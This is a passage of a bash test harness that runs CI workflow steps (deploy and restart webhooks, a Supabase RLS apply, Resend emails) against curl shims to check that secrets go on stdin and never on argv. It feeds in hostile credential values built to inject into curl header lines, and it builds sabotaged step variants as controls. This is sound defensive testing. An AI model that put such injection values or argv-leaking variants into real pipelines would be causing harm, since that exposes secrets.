  row "S4 row 1 restart trigger: a well-formed run sends ONE request whose three stdin headers are the independent digest over the body, the id and the secret; none is on argv" ok
else row "S4 row 1 restart trigger: well-formed run" fail "rc=$S4_RC calls=$(s4_ncalls)"; fi
# The trigger step's failure handler prints ONE message for any rc (no branch on rc == 2: rc 2 is also curl's own exit code): it names the rc, says that a marker line above means
# nothing was sent and otherwise the request may have reached the host, and keeps the exit code. A verdict that only checked "red + marker" would accept a silent abort.
S4_FAILMSG_REFUSED='If a SOLEUR_CREDENTIAL_REFUSED line is printed above, the credential was refused before any request was made and nothing was sent; otherwise the request may have reached the host'
s4_failmsg() { s4_said "::error::$1 webhook call failed (rc=$2). $S4_FAILMSG_REFUSED"; }
s4_v_r1() { [[ "$S4_RC" != 0 && "$(s4_markers)" == 1 ]] && ! s4_said 'Restart initiated' && ! s4_said 'Restart webhook rejected' && s4_failmsg Restart 2 && [[ "$S4_RC" == 2 ]]; }
s4_sweep r1 "$S4/b-r1.sh" "$S4/real" s4_v_r1 "CF_ACCESS_CLIENT_ID CF_ACCESS_CLIENT_SECRET" "WEBHOOK_SECRET"
s4_sweep_row "S4 row 1 restart trigger: an empty, unset or hostile credential is RED (rc 2 aborts under set -e) with ONE marker, zero requests, no 'rejected' line and the canary absent"
s4_nopy_row "S4 row 1 restart trigger (library HMAC site): python3 absent is RED with the marker and zero requests, never a mute abort" "$S4/b-r1.sh" s4_v_r1
S4_SHIM="$S4/shimreal"; s4_run r1-transport "$S4/b-r1.sh" "$S4/real" "${S4_BASE[@]}"; S4_SHIM="$S4/shim"
if [[ "$S4_RC" != 0 && "$(s4_markers)" == 0 ]] && ! s4_said 'Restart initiated' && s4_failmsg Restart 7 && [[ "$S4_RC" == 7 ]]; then row "S4 row 1 restart trigger: a REAL transport failure (closed port) is RED, is not a refusal (no marker), names rc=7 in its one failure line and exits with that code" ok
else row "S4 row 1 restart trigger: transport failure" fail "rc=$S4_RC markers=$(s4_markers) out=$(tail -2 "$S4_ROW/stdout" | tr '\n' '|')"; fi
s4_frame_ok="{\"component\":\"inngest\",\"exit_code\":0,\"reason\":\"success\",\"start_ts\":$((S4_NOW + 5))}"
s4_run r2-ok "$S4/b-r2.sh" "$S4/real" "${S4_BASE[@]}" TRIGGER_TS="$S4_NOW" SHIM_STATUS_BODY="$s4_frame_ok"
if [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 1 && "$(s4_markers)" == 0 ]] && s4_calls_ok 3 && s4_wh_ok "$S4/bodies/empty" 1 && s4_said 'Inngest restart completed successfully'; then
  row "S4 row 2 restart verify: a well-formed poll sends the digest over the EMPTY body plus the Cloudflare pair on stdin and reads the success frame" ok
else row "S4 row 2 restart verify: well-formed run" fail "rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers)"; fi
s4_lock_frame="{\"component\":\"inngest\",\"exit_code\":1,\"reason\":\"lock_contention\",\"start_ts\":$((S4_NOW + 5))}"
s4_run r2-lock "$S4/b-r2.sh" "$S4/real" "${S4_BASE[@]}" TRIGGER_TS="$S4_NOW" SHIM_STATUS_BODY="$s4_lock_frame" SHIM_LIVE_BODY='{"functions":[{"name":"synthetic-fn"}]}'
S4_LOCK_OK=1; for ((ci = 1; ci <= $(s4_ncalls); ci++)); do s4_wh_ok "$S4/bodies/empty" "$ci" || S4_LOCK_OK=0; done
if [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 5 && "$S4_LOCK_OK" == 1 && "$(s4_markers)" == 0 ]] && s4_calls_ok 3 && s4_said 'liveness healthy: functions registered'; then
  row "S4 row 2 restart verify: the lock_contention path drives the other three library sites (3 polls, the final STATE re-read, the liveness read): 5 requests, each with its own digest and the pair on stdin, none on argv" ok
else row "S4 row 2 restart verify: lock_contention path" fail "rc=$S4_RC calls=$(s4_ncalls) ok=$S4_LOCK_OK"; fi
s4_v_r2() { [[ "$S4_RC" != 0 && "$(s4_markers)" == 3 ]] && s4_said '::error::Restart did not complete within the' && ! s4_said 'Inngest restart completed'; }
S4_BASE=("${S4_WH_BASE[@]}" TRIGGER_TS="$S4_NOW" SHIM_STATUS_BODY="$s4_frame_ok")
s4_sweep r2 "$S4/b-r2.sh" "$S4/real" s4_v_r2 "CF_ACCESS_CLIENT_ID CF_ACCESS_CLIENT_SECRET" "WEBHOOK_SECRET"
s4_sweep_row "S4 row 2 restart verify: an empty, unset or hostile credential is the poll loop's old terminal RED with ONE marker per attempt (3 here), zero requests and the canary absent"
s4_nopy_row "S4 row 2 restart verify (library HMAC site): python3 absent reaches the same terminal red with the marker per attempt, never a mute abort" "$S4/b-r2.sh" s4_v_r2

# ---- row 4: apply-inngest-rls (library + pre-guard; the four calls had 2>/dev/null, so the marker was invisible) ----
S4_RLS=".github/workflows/apply-inngest-rls.yml"
s4_body "$REPO_ROOT/$S4_RLS" "Apply lockdown" "$S4/b-r4.sh"
S4_SBP="sbp""_$(od -An -N20 -tx1 /dev/urandom | tr -d ' \n')"
S4_RLS_BASE=(SUPABASE_ACCESS_TOKEN="$S4_SBP" PROJECT_REF=pigsfuxruiopinouvjwy PROJECT_NAME=soleur-inngest-prd SQL_FILE=apps/web-platform/infra/inngest-rls/0001_enable_rls_lockdown.sql SHIM_PROFILE=rls)
S4_BASE=("${S4_RLS_BASE[@]}")
s4_run r4-ok "$S4/b-r4.sh" "$S4/real" "${S4_BASE[@]}"
S4_RLS_OK=1; for ((ci = 1; ci <= $(s4_ncalls); ci++)); do [[ "$(s4_stdin_line "$ci" 1)" == "header = \"Authorization: Bearer $S4_SBP\"" ]] || S4_RLS_OK=0; done
if [[ "$S4_RC" == 0 && "$(s4_ncalls)" -ge 6 && "$S4_RLS_OK" == 1 && "$(s4_markers)" == 0 ]] && s4_calls_ok 1 && ! s4_argv_has "$S4_SBP" && s4_said 'Inngest RLS lockdown verified'; then
  row "S4 row 4 apply-inngest-rls: a well-formed run makes $(s4_ncalls) requests (identity, apply, the catalog queries, the advisor), each with the sbp_ token as its only stdin header and none on argv, and verifies the lockdown" ok
else row "S4 row 4 apply-inngest-rls: well-formed run" fail "rc=$S4_RC calls=$(s4_ncalls) ok=$S4_RLS_OK"; fi
s4_v_r4() { # a refusal is the existing secret class, never `identity_unreachable` (an empty HTTP code read as an unreachable API)
  [[ "$S4_RC" != 0 ]] && s4_gho_has 'failure_mode=secret_unset' && ! grep -q 'identity_unreachable' "$S4_ROW/gho" && ! s4_said 'identity_unreachable' || return 1
  case "$2" in hostile-*) [[ "$(s4_markers)" == 1 ]] ;; *) [[ "$(s4_markers)" == 0 ]] ;; esac
}
s4_sweep r4 "$S4/b-r4.sh" "$S4/real" s4_v_r4 "SUPABASE_ACCESS_TOKEN" ""
s4_sweep_row "S4 row 4 apply-inngest-rls: an empty, unset or hostile token is recorded as failure_mode=secret_unset (never identity_unreachable) with zero requests; a hostile one prints the marker ONCE"
S4_EMPTYWS="$S4/emptyws"; assert_fixture_dir "$S4_EMPTYWS"; mkdir -p "$S4_EMPTYWS"
s4_run r4-nolib "$S4/b-r4.sh" "$S4/real" "${S4_BASE[@]}" GITHUB_WORKSPACE="$S4_EMPTYWS"
if [[ "$S4_RC" != 0 && "$(s4_ncalls)" == 0 ]] && s4_said 'scripts/lib/bearer-curl.sh could not be loaded'; then row "S4 row 4 apply-inngest-rls: a checkout without the library is a hard failure with zero requests and no argv fallback" ok
else row "S4 row 4 apply-inngest-rls: library absent" fail "rc=$S4_RC calls=$(s4_ncalls)"; fi
# The marker must stay VISIBLE where a refusal reaches the call itself. The pre-guard normally stands in front of every call, so the row
# neutralizes it in a COPY of the library (bc_ok_var always true) and runs the real step: the first call's own refusal is then the only
# thing that can print the marker, and a `2>/dev/null` on that call would swallow it.
S4_NOGUARD="$S4/ws-noguard"; assert_fixture_dir "$S4_NOGUARD"; mkdir -p "$S4_NOGUARD/scripts/lib"
{ cat "$REPO_ROOT/scripts/lib/bearer-curl.sh"; printf '%s\n' 'bc_ok_var() { return 0; }'; } > "$S4_NOGUARD/scripts/lib/bearer-curl.sh"
s4_run r4-visible "$S4/b-r4.sh" "$S4/real" "${S4_BASE[@]}" "SUPABASE_ACCESS_TOKEN=${S4_CANARY}\"x" GITHUB_WORKSPACE="$S4_NOGUARD"
if [[ "$S4_RC" != 0 && "$(s4_ncalls)" == 0 && "$(s4_markers)" == 1 ]] && s4_canary_clean; then
  row "S4 row 4 apply-inngest-rls: when a refusal reaches the identity call itself it aborts the step RED with the marker VISIBLE (no 2>/dev/null on the call), zero requests, the canary absent" ok
else row "S4 row 4 apply-inngest-rls: marker-visible row" fail "rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers)"; fi

# ---- rows 8 to 12: web-platform-release (INLINE wrappers: the jobs are checkout-free by design) ----
S4_WFR=".github/workflows/web-platform-release.yml"
mapfile -t S4_REL_JOBENV < <(s4_jobenv "$REPO_ROOT/$S4_WFR" deploy)
s4_body "$REPO_ROOT/$S4_WFR" "Pre-rerun lock probe" "$S4/b-r8.sh"
s4_body "$REPO_ROOT/$S4_WFR" "Deploy via webhook" "$S4/b-r9.sh"
s4_body "$REPO_ROOT/$S4_WFR" "Verify deploy script completion" "$S4/b-r10.sh"
s4_body "$REPO_ROOT/$S4_WFR" "Verify peer deploy completion" "$S4/b-r10p.sh"
s4_body "$REPO_ROOT/$S4_WFR" "Email notification (deploy FAILED)" "$S4/b-r11.sh"
s4_body "$REPO_ROOT/$S4_WFR" "email" "$S4/b-r12.sh"
# Each step gets ONLY what its YAML declares (s4_run drops the rest and the final "declared environment" row asserts nothing was dropped):
# the job env for the lock probe, plus VERSION for the verify poll, plus VERSION and the peer list for the deploy call.
S4_REL_ENV=("${S4_REL_JOBENV[@]}" VERSION=1.2.3)
# row 9 (red class): Deploy via webhook
S4_BASE=("${S4_WH_BASE[@]}" "${S4_REL_ENV[@]}" WEB_HOST_PRIVATE_IPS=10.0.1.10,10.0.1.11)
s4_run r9-ok "$S4/b-r9.sh" "$S4/real" "${S4_BASE[@]}"
if [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 1 ]] && s4_calls_ok 3 && s4_wh_ok "$S4_ROW/calls/1.body" 1 && s4_said 'Deploy initiated (HTTP 202)' \
   && grep -qF '"peers":"10.0.1.10,10.0.1.11"' "$S4_ROW/calls/1.body" && grep -qF 'soleur-web-platform v1.2.3' "$S4_ROW/calls/1.body"; then
  row "S4 row 9 release deploy (inline): a well-formed run signs the body it sends (independent openssl digest over the recorded bytes) and carries the pair on stdin, none on argv" ok
else row "S4 row 9 release deploy (inline): well-formed run" fail "rc=$S4_RC calls=$(s4_ncalls)"; fi
s4_v_r9() { [[ "$S4_RC" != 0 && "$(s4_markers)" == 1 ]] && ! s4_said 'Deploy initiated' && ! s4_said 'Deploy webhook rejected' && s4_failmsg Deploy 2 && [[ "$S4_RC" == 2 ]]; }
s4_sweep r9 "$S4/b-r9.sh" "$S4/real" s4_v_r9 "CF_ACCESS_CLIENT_ID CF_ACCESS_CLIENT_SECRET" "WEBHOOK_SECRET"
s4_sweep_row "S4 row 9 release deploy (inline, red class): an empty, unset or hostile credential aborts the step RED before any request (production stays on the previous build) with ONE marker and the canary absent"
s4_nopy_row "S4 row 9 release deploy (inline HMAC site): python3 absent is RED with the marker and zero requests, never a mute abort" "$S4/b-r9.sh" s4_v_r9
S4_SHIM="$S4/shimreal"; s4_run r9-transport "$S4/b-r9.sh" "$S4/real" "${S4_BASE[@]}"; S4_SHIM="$S4/shim"
if [[ "$S4_RC" != 0 && "$(s4_markers)" == 0 ]] && ! s4_said 'Deploy initiated' && s4_failmsg Deploy 7 && [[ "$S4_RC" == 7 ]]; then row "S4 row 9 release deploy: a REAL transport failure (closed port) is still RED and is not a refusal (no marker; the one failure line names rc=7 and the process exits with that code)" ok
else row "S4 row 9 release deploy: transport failure" fail "rc=$S4_RC markers=$(s4_markers)"; fi
# CONTROLS for the failure handler: (1) a handler that ends in a SILENT abort (the message line removed) is judged RED by the refusal verdict; (2) a handler that exits 1 for
# `exit "$rc"` is caught by the exit-code clause: a transport failure must exit with curl's own code (7).
S4_SA_BUILT=0; S4_EX_BUILT=0; S4_SA_RED=0; S4_EX_RED=0
s4_body_try "$REPO_ROOT/$S4_WFR" "Deploy via webhook" "$S4/b-ctl-r9-silent.sh" 'echo "::error::Deploy webhook call failed' ': # echo "::error::Deploy webhook call failed' && S4_SA_BUILT=1
s4_body_try "$REPO_ROOT/$S4_WFR" "Deploy via webhook" "$S4/b-ctl-r9-exit1.sh" 'exit "$rc"' 'exit 1' && S4_EX_BUILT=1
if [[ "$S4_SA_BUILT" == 1 ]]; then
  s4_run ctl-r9-silent "$S4/b-ctl-r9-silent.sh" "$S4/real" "${S4_BASE[@]}" "CF_ACCESS_CLIENT_ID=${S4_CANARY}\"x"; S4_REFUSAL_RUNS=$((S4_REFUSAL_RUNS + 1))
  ! s4_v_r9 && S4_SA_RED=1
fi
if [[ "$S4_EX_BUILT" == 1 ]]; then
  S4_SHIM="$S4/shimreal"; s4_run ctl-r9-exit1 "$S4/b-ctl-r9-exit1.sh" "$S4/real" "${S4_BASE[@]}"; S4_SHIM="$S4/shim"
  s4_failmsg Deploy 7 && [[ "$S4_RC" != 7 ]] && S4_EX_RED=1
fi
if [[ "$S4_SA_RED" == 1 && "$S4_EX_RED" == 1 ]]; then row "S4 row 9 release deploy control: a handler that aborts silently (no failure line) is judged RED by the refusal verdict, and one that exits 1 instead of the call's own code is caught by the exit-code clause (a transport failure must exit 7)" ok
else row "S4 row 9 release deploy control: a silent or exit-swallowing handler is not judged red" fail "built=$S4_SA_BUILT/$S4_EX_BUILT red=$S4_SA_RED/$S4_EX_RED"; fi
# CONTROL (the key must be on NO tool's argument list, not only curl's): the same step with the key moved onto python3's argv (an `-X` option python ignores, so the
# signature stays VALID and curl's argv stays clean) is judged RED by the very predicate the HMAC rows use, and only by its python3 clause.
S4_PY_BUILT=0; s4_body_try "$REPO_ROOT/$S4_WFR" "Deploy via webhook" "$S4/b-r9-pyargv.sh" 'python3 -I -c' 'python3 -I -X "k=$WEBHOOK_SECRET" -c' && S4_PY_BUILT=1
if [[ "$S4_PY_BUILT" == 1 ]]; then s4_run ctl-r9-pyargv "$S4/b-r9-pyargv.sh" "$S4/real" "${S4_BASE[@]}"; fi
if [[ "$S4_PY_BUILT" == 1 && "$S4_RC" == 0 && "$(s4_ncalls)" == 1 ]] && s4_calls_ok 3 && ! s4_argv_has "$S4_KEY" && s4_tool_argv_has python3 "$S4_KEY" && ! s4_wh_ok "$S4_ROW/calls/1.body" 1; then
  row "S4 HMAC control: a signer that puts the key on python3's argument list (signature still valid, curl's argv clean) is judged RED by the HMAC rows' predicate" ok
else row "S4 HMAC control: a key on python3's argv is not judged red" fail "built=$S4_PY_BUILT rc=$S4_RC calls=$(s4_ncalls) py=$(s4_tool_argv_has python3 "$S4_KEY" && echo seen || echo missed) wh=$(s4_wh_ok "$S4_ROW/calls/1.body" 1 && echo green || echo red)"; fi
# row 10: Verify deploy script completion (poll loop)
S4_BASE=("${S4_WH_BASE[@]}" "${S4_REL_ENV[@]}" STATUS_POLL_MAX_ATTEMPTS=3 STATUS_POLL_INTERVAL_S=0 SHIM_STATUS_BODY='{"exit_code":0,"reason":"ok","tag":"v1.2.3"}')
s4_run r10-ok "$S4/b-r10.sh" "$S4/real" "${S4_BASE[@]}"
if [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 1 ]] && s4_calls_ok 3 && s4_wh_ok "$S4/bodies/empty" 1 && s4_said 'ci-deploy.sh completed successfully for v1.2.3'; then
  row "S4 row 10 release verify (inline): a well-formed poll carries the digest over the empty body and the pair on stdin and reads the completion" ok
else row "S4 row 10 release verify (inline): well-formed run" fail "rc=$S4_RC calls=$(s4_ncalls)"; fi
s4_v_r10() { [[ "$S4_RC" != 0 && "$(s4_markers)" == 3 ]] && s4_said '::error::ci-deploy.sh did not report completion for v1.2.3'; }
s4_sweep r10 "$S4/b-r10.sh" "$S4/real" s4_v_r10 "CF_ACCESS_CLIENT_ID CF_ACCESS_CLIENT_SECRET" "WEBHOOK_SECRET"
s4_sweep_row "S4 row 10 release verify (inline): an empty, unset or hostile credential is the poll's old terminal RED with ONE marker per attempt, zero requests and the canary absent"
s4_nopy_row "S4 row 10 release verify (inline HMAC site): python3 absent reaches the terminal red with the marker per attempt" "$S4/b-r10.sh" s4_v_r10
# row 8 (soft class): the pre-rerun lock probe is DEGRADED-PERMISSIVE: a refusal proceeds, with the marker visible
S4_BASE=("${S4_WH_BASE[@]}" "${S4_REL_JOBENV[@]}" SHIM_STATUS_BODY='{"exit_code":0}')
s4_run r8-ok "$S4/b-r8.sh" "$S4/real" "${S4_BASE[@]}"
if [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 1 ]] && s4_calls_ok 3 && s4_wh_ok "$S4/bodies/empty" 1 && s4_said 'Pre-rerun probe: no in-flight deploy (exit_code=0)'; then
  row "S4 row 8 release lock probe (inline): a well-formed run reads the idle state through the digest and the pair on stdin" ok
else row "S4 row 8 release lock probe (inline): well-formed run" fail "rc=$S4_RC calls=$(s4_ncalls)"; fi
s4_v_r8() { [[ "$S4_RC" == 0 && "$(s4_markers)" == 1 ]] && s4_said 'Pre-rerun probe: non-JSON or empty body (HTTP 000) — proceeding (degraded-permissive)' && ! s4_said 'Prior deploy'; }
s4_sweep r8 "$S4/b-r8.sh" "$S4/real" s4_v_r8 "CF_ACCESS_CLIENT_ID CF_ACCESS_CLIENT_SECRET" "WEBHOOK_SECRET"
s4_sweep_row "S4 row 8 release lock probe (inline, soft class): an empty, unset or hostile credential PROCEEDS (exit 0, degraded-permissive) with the marker visible once, zero requests and the canary absent"
S4_SHIM="$S4/shimreal"; s4_run r8-transport "$S4/b-r8.sh" "$S4/real" "${S4_BASE[@]}"; S4_SHIM="$S4/shim"
if [[ "$S4_RC" == 0 && "$(s4_markers)" == 0 ]] && s4_said 'Pre-rerun probe: non-JSON or empty body (HTTP 000000)'; then row "S4 row 8 release lock probe: a REAL transport failure keeps the documented 000000 quirk and proceeds, with no marker" ok
else row "S4 row 8 release lock probe: transport failure" fail "rc=$S4_RC markers=$(s4_markers) out=$(tail -2 "$S4_ROW/stdout" | tr '\n' '|')"; fi
# rows 11 and 12 (warning class): the Resend email steps. Hostile = the old delivery failure with the marker; empty/unset = the step's OWN message.
S4_RESEND="re""_$(od -An -N16 -tx1 /dev/urandom | tr -d ' \n')"
S4_BASE=(RESEND_API_KEY="$S4_RESEND" MIRROR_VERIFIED=true RUN_URL=https://example.invalid/run VERSION=1.2.3 SHIM_PROFILE=generic)
s4_run r11-ok "$S4/b-r11.sh" "$S4/real" "${S4_BASE[@]}"
if [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 1 && "$(s4_stdin_line 1 1)" == "header = \"Authorization: Bearer $S4_RESEND\"" ]] && s4_calls_ok 1 && ! s4_argv_has "$S4_RESEND" && s4_said 'Deploy-failure email sent to ops@jikigai.com (HTTP 200)'; then
  row "S4 row 11 deploy-failure email (inline): a well-formed run sends the re_ key as the only stdin header and none on argv" ok
else row "S4 row 11 deploy-failure email (inline): well-formed run" fail "rc=$S4_RC calls=$(s4_ncalls)"; fi
s4_v_r11() { [[ "$S4_RC" == 0 ]] || return 1
  case "$2" in
    hostile-*) [[ "$(s4_markers)" == 1 ]] && s4_said '::error::Deploy-failure email FAILED (HTTP 000)' ;;
    *) [[ "$(s4_markers)" == 0 ]] && s4_said '::error::RESEND_API_KEY not set' ;;
  esac; }
s4_sweep r11 "$S4/b-r11.sh" "$S4/real" s4_v_r11 "RESEND_API_KEY" ""
s4_sweep_row "S4 row 11 deploy-failure email (inline, warning class): a hostile key is the old '::error:: Deploy-failure email FAILED (HTTP 000)' line (exit 0, non-fatal) with the marker ONCE and zero requests; an empty or unset key keeps its own message"
S4_SHIM="$S4/shimreal"; s4_run r11-transport "$S4/b-r11.sh" "$S4/real" "${S4_BASE[@]}"; S4_SHIM="$S4/shim"
if [[ "$S4_RC" == 0 && "$(s4_markers)" == 0 ]] && s4_said '::error::Deploy-failure email FAILED (HTTP 000000)'; then row "S4 row 11 deploy-failure email: a REAL transport failure keeps the 000000 quirk and the same non-fatal error line, no marker" ok
else row "S4 row 11 deploy-failure email: transport failure" fail "rc=$S4_RC"; fi
S4_BASE=(RESEND_API_KEY="$S4_RESEND" CLASSIFIER=failure FAILED=live-verify FAILED_HTML='<li>live-verify</li>' R_DEPLOY=failure TAG=v1.2.3 VERSION=1.2.3 RUN_URL=https://example.invalid/run SHIM_PROFILE=generic)
s4_run r12-ok "$S4/b-r12.sh" "$S4/real" "${S4_BASE[@]}"
if [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 1 && "$(s4_stdin_line 1 1)" == "header = \"Authorization: Bearer $S4_RESEND\"" ]] && s4_calls_ok 1 && s4_gho_has 'delivered=1'; then row "S4 row 12 release-outcome email (inline): a well-formed run delivers (delivered=1) with the key on stdin only" ok
else row "S4 row 12 release-outcome email (inline): well-formed run" fail "rc=$S4_RC calls=$(s4_ncalls)"; fi
s4_v_r12() { [[ "$S4_RC" == 0 ]] || return 1
  case "$2" in
    hostile-*) [[ "$(s4_markers)" == 1 ]] && s4_gho_has 'delivered=0' && s4_gho_has 'reason=resend_http_000' ;;
    *) [[ "$(s4_markers)" == 0 ]] && s4_gho_has 'delivered=0' && s4_gho_has 'reason=resend_api_key_unset' ;;
  esac; }
s4_sweep r12 "$S4/b-r12.sh" "$S4/real" s4_v_r12 "RESEND_API_KEY" ""
s4_sweep_row "S4 row 12 release-outcome email (inline, warning class): a hostile key reads as the old delivery failure (delivered=0, reason=resend_http_000, exit 0) so the Sentry fallback still fires; an empty or unset key keeps its own reason"
echo "=== stage S4: Guard 2 rows 1, 2, 4, 8 to 12 done ==="

# ---- rows 13 to 15: apply-deploy-pipeline-fix (library; the step reads its credentials through doppler, stubbed by secret NAME) ----
S4_DPF=".github/workflows/apply-deploy-pipeline-fix.yml"
S4_CWD="$REPO_ROOT/apps/web-platform/infra"     # the steps carry `working-directory: ${{ env.INFRA_DIR }}`
s4_body "$REPO_ROOT/$S4_DPF" "pre_frame" "$S4/b-r13.sh"
s4_body "$REPO_ROOT/$S4_DPF" "Verify webhook is alive post-apply" "$S4/b-r14.sh"
s4_body "$REPO_ROOT/$S4_DPF" "webhook_liveness" "$S4/b-r15.sh"
# row 13: pre_frame "degrades loudly, never blocks": a refusal records PRE_FRAME_STATUS=secret_unavailable (the existing "credential unusable" class)
S4_BASE=("${S4_DOP_BASE[@]}" SHIM_STATUS_BODY='{"start_ts":1700000123}')
s4_run r13-ok "$S4/b-r13.sh" "$S4/real" "${S4_BASE[@]}"
if [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 1 && "$(s4_markers)" == 0 ]] && s4_calls_ok 3 && s4_wh_ok "$S4/bodies/empty" 1 && s4_genv_has 'PRE_FRAME_STATUS=ok' && s4_genv_has 'PRE_APPLY_FRAME_START_TS=1700000123'; then
  row "S4 row 13 pre_frame: a well-formed run reads the frame through the digest over the empty body and the pair on stdin and records PRE_FRAME_STATUS=ok" ok
else row "S4 row 13 pre_frame: well-formed run" fail "rc=$S4_RC calls=$(s4_ncalls)"; fi
s4_v_r13() { [[ "$S4_RC" == 0 ]] && s4_genv_has 'PRE_FRAME_STATUS=secret_unavailable' && ! grep -qE '^PRE_FRAME_STATUS=(unreachable|malformed|http404|ok|error)$' "$S4_ROW/genv" || return 1
  case "$1:$2" in
    D_CF_*) [[ "$(s4_markers)" == 1 ]] ;;
    *) [[ "$(s4_markers)" == 0 ]] ;;
  esac; }
s4_sweep r13 "$S4/b-r13.sh" "$S4/real" s4_v_r13 "D_CF_ACCESS_CLIENT_ID D_CF_ACCESS_CLIENT_SECRET" "D_WEBHOOK_DEPLOY_SECRET"
s4_sweep_row "S4 row 13 pre_frame: an empty, unset or hostile credential records PRE_FRAME_STATUS=secret_unavailable (never unreachable), exits 0, makes zero requests; the Cloudflare pair prints the marker once, the key arm keeps its own warning"
s4_nopy_row "S4 row 13 pre_frame (library HMAC site): python3 absent records secret_unavailable, exits 0, makes zero requests (the apply is never blocked)" "$S4/b-r13.sh" s4_v_r13
S4_SHIM="$S4/shimreal"; s4_run r13-transport "$S4/b-r13.sh" "$S4/real" "${S4_BASE[@]}"; S4_SHIM="$S4/shim"
if [[ "$S4_RC" == 0 && "$(s4_markers)" == 0 ]] && s4_genv_has 'PRE_FRAME_STATUS=unreachable'; then row "S4 row 13 pre_frame: a REAL transport failure still records PRE_FRAME_STATUS=unreachable (the old class for a request that was sent and failed)" ok
else row "S4 row 13 pre_frame: transport failure" fail "rc=$S4_RC env=$(tr '\n' ' ' < "$S4_ROW/genv")"; fi
# row 14: Verify webhook is alive post-apply: a refusal is the step's old red (three attempts, then the ::error::), marker visible per attempt
S4_BASE=("${S4_DOP_BASE[@]}" SHIM_STATUS_BODY='{"start_ts":1700000123}')
s4_run r14-ok "$S4/b-r14.sh" "$S4/real" "${S4_BASE[@]}"
if [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 1 ]] && s4_calls_ok 3 && s4_wh_ok "$S4/bodies/empty" 1 && s4_said 'Webhook is alive (HTTP 200 on attempt 1)'; then row "S4 row 14 post-apply liveness: a well-formed run is alive on the first attempt through the digest and the pair on stdin" ok
else row "S4 row 14 post-apply liveness: well-formed run" fail "rc=$S4_RC calls=$(s4_ncalls)"; fi
s4_run r14-empty "$S4/b-r14.sh" "$S4/real" "${S4_BASE[@]}" D_WEBHOOK_DEPLOY_SECRET=
if [[ "$S4_RC" != 0 && "$(s4_ncalls)" == 0 && "$(s4_markers)" == 3 ]] && s4_said '::error::Webhook did not respond with HTTP 200 after 3 attempts'; then row "S4 row 14 post-apply liveness: an empty key is the old red (the 3-attempt ::error::) with the marker per attempt and zero requests" ok
else row "S4 row 14 post-apply liveness: empty key" fail "rc=$S4_RC calls=$(s4_ncalls) markers=$(s4_markers)"; fi
# row 15: webhook_liveness, CF pair only: today 401/403 -> probe_error (OUR credential), anything else -> `down` ("the re-push bricked the only no-SSH channel")
S4_BASE=(D_CF_ACCESS_CLIENT_ID="$S4_CFID" D_CF_ACCESS_CLIENT_SECRET="$S4_CFSEC" SHIM_PROFILE=webhook)
s4_run r15-ok "$S4/b-r15.sh" "$S4/real" "${S4_BASE[@]}"
if [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 1 && "$(s4_stdin_line 1 1)" == "header = \"CF-Access-Client-Id: $S4_CFID\"" && "$(s4_stdin_line 1 2)" == "header = \"CF-Access-Client-Secret: $S4_CFSEC\"" ]] && s4_calls_ok 2 \
   && ! s4_argv_has "$S4_CFID" && ! s4_argv_has "$S4_CFSEC" && s4_gho_has 'listener_state=up'; then
  row "S4 row 15 webhook_liveness: a well-formed run sends the Cloudflare pair ONLY (two stdin headers, none on argv) and records listener_state=up" ok
else row "S4 row 15 webhook_liveness: well-formed run" fail "rc=$S4_RC calls=$(s4_ncalls)"; fi
s4_run r15-403 "$S4/b-r15.sh" "$S4/real" "${S4_BASE[@]}" SHIM_CODE=403
[[ "$S4_RC" != 0 && "$(s4_ncalls)" == 1 ]] && s4_gho_has 'listener_state=probe_error' && row "S4 row 15 webhook_liveness: a 403 from Cloudflare Access stays listener_state=probe_error (the old class)" ok || row "S4 row 15 webhook_liveness: 403" fail "rc=$S4_RC"
S4_SHIM="$S4/shimreal"; s4_run r15-transport "$S4/b-r15.sh" "$S4/real" "${S4_BASE[@]}"; S4_SHIM="$S4/shim"
[[ "$S4_RC" != 0 && "$(s4_markers)" == 0 ]] && s4_gho_has 'listener_state=down' && row "S4 row 15 webhook_liveness: a REAL transport failure is still listener_state=down (a request that was sent and got nothing), no marker" ok || row "S4 row 15 webhook_liveness: transport failure" fail "rc=$S4_RC"
s4_v_r15() { [[ "$S4_RC" != 0 ]] && s4_gho_has 'listener_state=probe_error' && ! grep -qE '^listener_state=(down|up)$' "$S4_ROW/gho" && ! s4_said 'bricked the only no-SSH remediation channel' || return 1
  case "$2" in hostile-*) [[ "$(s4_markers)" == 1 ]] ;; *) [[ "$(s4_markers)" == 0 ]] ;; esac; }
s4_sweep r15 "$S4/b-r15.sh" "$S4/real" s4_v_r15 "D_CF_ACCESS_CLIENT_ID D_CF_ACCESS_CLIENT_SECRET" ""
s4_sweep_row "S4 row 15 webhook_liveness: an empty, unset or hostile Cloudflare credential records listener_state=probe_error (NEVER down: no 'bricked the only no-SSH channel' claim), exits 1, makes zero requests; a hostile one prints the marker once"

# ---- row 18: the scheduled-inngest-health probe (library + pre-guard): a refusal is `secret_unset`, which files the liveness-probe issue and restarts NOTHING ----
S4_SIH=".github/workflows/scheduled-inngest-health.yml"
s4_body "$REPO_ROOT/$S4_SIH" "probe" "$S4/b-r18.sh"
S4_LIVE_OK='{"functions":[{"name":"synthetic-fn"}],"durability_state":"durable"}'
S4_BASE=("${S4_WH_BASE[@]}" SHIM_LIVE_BODY="$S4_LIVE_OK")
s4_run r18-ok "$S4/b-r18.sh" "$S4/real" "${S4_BASE[@]}"
if [[ "$S4_RC" == 0 && "$(s4_ncalls)" == 1 && "$(s4_markers)" == 0 ]] && s4_calls_ok 3 && s4_wh_ok "$S4/bodies/empty" 1 && s4_gho_has 'failure_mode=' && s4_gho_has 'durability_state=durable'; then
  row "S4 row 18 inngest-health probe: a well-formed run reads the liveness hook through the digest and the pair on stdin and records NO failure_mode" ok
else row "S4 row 18 inngest-health probe: well-formed run" fail "rc=$S4_RC calls=$(s4_ncalls) gho=$(tr '\n' ' ' < "$S4_ROW/gho")"; fi
